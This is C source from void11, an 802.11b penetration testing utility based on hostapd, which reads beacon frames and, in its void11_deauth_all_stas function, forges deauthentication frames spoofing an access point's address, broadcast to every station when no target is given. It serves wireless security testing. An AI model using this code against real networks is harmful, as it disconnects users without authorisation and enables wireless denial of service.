/*
 * .vantronix | void11 (802.11b penetration testing utility)
 *
 * last change: 11/26/2013
 * modified by Hao
 *
 * Copyright (c) 2002-2003, Reyk Floeter <reyk@vantronix.net>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation. See README and COPYING for
 * more details.
 */

/* based on hostapd by Jouni Malinen <jkmaline@cc.hut.fi> */

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>
#include <sys/ioctl.h>
#include <signal.h>
#include <arpa/inet.h>
#include <time.h>
#include <asm/errno.h>

#include <sys/socket.h>
#include <asm/types.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>   /* The L2 protocols */
#include <linux/if_arp.h>
#include <linux/wireless.h>

#if WIRELESS_EXT < 9
#error "Linux Wireless Extensions version 9 or newer required"
#endif

#include "void11.h"

/**** changing mark -Hao ****/
//unsigned char rfc1042_header[6] = { 0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00 };
static inline int hex2int(char c) {
	if (c >= '0' && c <= '9')
		return (c - '0');
	if (c >= 'a' && c <= 'f')
		return (c - 'a' + 10);
	if (c >= 'A' && c <= 'F')
		return (c - 'A' + 10);
	return (-1);
}

int macstr2addr(char *macstr, u8 *addr) {
	int i, val, val2;
	char *pos = macstr;

	for (i = 0; i < 6; i++) {
		val = hex2int(*pos++);
		if (val < 0)
			return (-1);
		val2 = hex2int(*pos++);
		if (val2 < 0)
			return (-1);
		addr[i] = (val * 16 + val2) & 0xff;

		if (i < 5 && *pos++ != ':')
			return (-1);
	}

	return 0;
}

struct void11_ap *void11_read(hostapd *void11) {
	int len;
	unsigned char buf[3000];
	struct ieee80211_mgmt *hdr;
	struct void11_ap *a;
	u16 fc;

	if ((a = malloc(sizeof(struct void11_ap))) == NULL)
		return (NULL);

	if ((len = read(void11->sock, buf, sizeof(buf))) < 0)
		return (NULL);

	if (void11->hapd->conf->debug >= HOSTAPD_DEBUG_MSGDUMPS + 1) {
		int i;
		DPUT("  dump:");
		for (i = 0; i < len; i++)
			DPRINT(" %02x", buf[i]);
		DPUT("\n");
	}

	hdr = (struct ieee80211_mgmt*) buf;
	fc = le_to_host16(hdr->frame_control);

	if (WLAN_FC_GET_TYPE(fc) != WLAN_FC_TYPE_MGMT ||
	WLAN_FC_GET_STYPE(fc) != WLAN_FC_STYPE_BEACON)
		return (NULL);

	memcpy(a->bssid, hdr->bssid, ETH_ALEN);
	a->timestamp = time(NULL);

	if (void11->conf->debug > HOSTAPD_DEBUG_MINIMAL)
		DPRINT("Received %d bytes beacon frame " MACSTR "\n", len,
				MAC2STR(a->bssid));

	(void) ieee802_11_parse_elems(void11, hdr->u.beacon.variable,
			len - (IEEE80211_HDRLEN + sizeof(hdr->u.beacon)), &a->elems);

	a->elems.ssid[a->elems.ssid_len] = '\0';

	return (a);
}

/**** Change Here -Hao *****/
int void11_deauth_all_stas(hostapd *void11, u8 *station, u8 *bssid) {
	struct ieee80211_mgmt mgmt;

	memset(&mgmt, 0, sizeof(mgmt));
	mgmt.frame_control = IEEE80211_FC(WLAN_FC_TYPE_MGMT, WLAN_FC_STYPE_DEAUTH);
	if (station != NULL)
		memcpy(mgmt.da, station, ETH_ALEN);
	else
		memset(mgmt.da, 0xff, ETH_ALEN);
	memcpy(mgmt.sa, bssid, ETH_ALEN);
	memcpy(mgmt.bssid, bssid, ETH_ALEN);
	mgmt.u.deauth.reason_code = host_to_le16(WLAN_REASON_PREV_AUTH_NOT_VALID);
	if (send(void11->sock, &mgmt, IEEE80211_HDRLEN + sizeof(mgmt.u.deauth), 0)
			< 0) {
		if (void11->conf->debug > HOSTAPD_DEBUG_MINIMAL)
			perror("void11_deauth_all_stas: send");
		return (-1);
	}

	return 0;
}

int void11_flush(hostapd *void11) {
	struct prism2_hostapd_param param;

	memset(&param, 0, sizeof(param));
	param.cmd = PRISM2_HOSTAPD_FLUSH;
	return (hostapd_ioctl(void11, &param));
}

int void11_init(hostapd *void11, char *iface) {
	int ret = 0;

	snprintf(void11->hapd->conf->iface, sizeof(void11->hapd->conf->iface), "%s", iface);

    //to here as same as receive.c
	// except the last line at receive.c
	hostapd_init_sockets(void11);
	void11->hapd->conf->ssid.ssid_len = 2;

	if (strlen(void11->hapd->conf->ssid.ssid) < 1) {
		memset(void11->hapd->conf->ssid.ssid, 0, void11->hapd->conf->ssid.ssid_len);
		strcpy(void11->hapd->conf->ssid.ssid, " "); //, void11->hapd->conf->ssid.ssid_len);
	}

	/* Set SSID for the kernel driver (to be used in beacon and probe
	 * response frames) */
	if ((ret = hostap_ioctl_setiwessid(void11, void11->hapd->conf->ssid.ssid,
			void11->hapd->conf->ssid.ssid_len)) != 0) {
		DPUT("Could not set SSID for kernel driver\n");
		void11_exit(void11);
		return (ret);
	}

	void11_flush(void11);

	return (0);
}

int void11_exit(hostapd *void11) {
	void11_flush(void11);

	hostapd_set_iface_flags(void11, 0);

	if (void11->sock >= 0)
		close(void11->sock);
	if (void11->ioctl_sock >= 0)
		close(void11->ioctl_sock);
	free(void11->default_wep_key);

	return (0);
}
